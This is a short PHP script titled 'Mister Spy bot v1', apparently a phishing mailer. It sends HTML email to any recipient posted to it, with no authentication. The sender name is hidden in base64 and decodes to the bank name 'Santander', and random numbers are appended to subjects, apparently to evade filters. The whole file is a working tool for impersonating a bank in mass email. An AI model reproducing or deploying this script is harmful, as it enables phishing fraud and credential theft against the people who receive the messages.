Mister Spy bot v1
<?php
$to = $_POST["to"];
$subject= $_POST["subject"]. $dataHora = rand(100000000,100000000000000000);;
$message= $_POST["message"];

$headers = array(
  'From: "=?UTF-8?B?U2FudGFuZGVy?=" <no-reply>' ,
  'X-Mailer: PHP/' . phpversion() ,
  'MIME-Version: 1.0' ,
  'Content-type: text/html; charset=iso-8859-1'
);
$headers = implode( "\r\n" , $headers ); 

mail($to, $subject, $message, $headers);
?>